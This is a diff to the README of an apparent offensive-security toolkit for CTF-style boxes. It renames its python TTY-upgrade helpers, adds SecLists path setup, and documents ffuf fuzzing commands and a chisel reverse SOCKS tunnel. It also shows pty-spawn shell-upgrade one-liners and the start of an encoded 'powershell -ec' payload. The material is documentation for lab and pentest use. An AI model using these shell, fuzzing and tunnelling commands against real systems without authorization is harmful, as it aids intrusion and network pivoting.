@@ -78,30 +78,16 @@ powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
 ```
 
 ## TTY upgrades
-### > py_tty_upgrade
-Copies the python(2) tty upgrade command to the clipboard. 
+### > uptty
+Copies the python(2) and python3 tty upgrade command to the clipboard. 
 Example: 
 ```
 ┌──(jazz㉿kali)-[~/jazz]
-└─$ py_tty_upgrade
+└─$ uptty
 ```
 Clipboard contents after:
 ```
-python -c 'import pty;pty.spawn("/bin/bash")'
-```
-> #### Notes
-> - Requires `xclip` to be installed
-
-### > py3_tty_upgrade
-Exactly the same as above but with python3. 
-Example: 
-```
-┌──(jazz㉿kali)-[~/jazz]
-└─$ py3_tty_upgrade 
-```
-Clipboard contents after:
-```
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 > #### Notes
 > - Requires `xclip` to be installed
@@ -183,21 +169,52 @@ Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
 > - This only scans the default UDP ports. Add `-p-` as an argument to scan all ports.
 > - Uses `sudo` to get the privileges required for a UDP scan
 
+
+## SecLists Path
+
+> #### Notes
+> - Many of the functions in this toolkit use wordlists from the SecLists project. To ensure these functions work correctly, the scripts need to know where to find the SecLists directory. The toolkit uses the following logic to locate SecLists:
+
+1. First, it checks if `/opt/seclists/` exists.
+2. If not, it checks if `/usr/share/seclists/` exists.
+3. If neither of these directories exist, it looks for an environment variable called `SECLISTS_PATH`.
+
+To set up SecLists for use with these scripts:
+
+1. Install SecLists in one of the standard locations (`/opt/seclists/` or `/usr/share/seclists/`).
+   
+   OR
+
+2. Set the `SECLISTS_PATH` environment variable to point to your SecLists installation:
+
+   ```bash
+   export SECLISTS_PATH="/path/to/seclists"
+   # You can add this line to your .bashrc or .zshrc file to make it permanent.
+    ```
+
 ## Web Fuzzing
-### > vhost $domain (extra arguments)
+### > vhost $domain (-w wordlist) (extra arguments)
 Performs virtual host discovery using ffuf.
 Example:
 ```
 ┌──(22sh㉿kali)-[~]
 └─$ vhost box.htb
 ```
-
 ### > fuzz_dir $url (extra arguments)
 Performs directory and files fuzzing using ffuf.
 Exemple:
 ```
 ┌──(22sh㉿kali)-[~]
 └─$ fuzz_dir http://box.htb
+
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt
+
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -fs 245
+
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
 ```
 
 ## Chisel Tunneling
@@ -208,7 +225,6 @@ Example:
 ```
 ┌──(22sh㉿kali)-[~/jazz]
 └─$ chisel_socks 10.10.14.10 8888
-
 [+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
 2024/08/05 23:31:03 server: Reverse tunnelling enabled
 2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
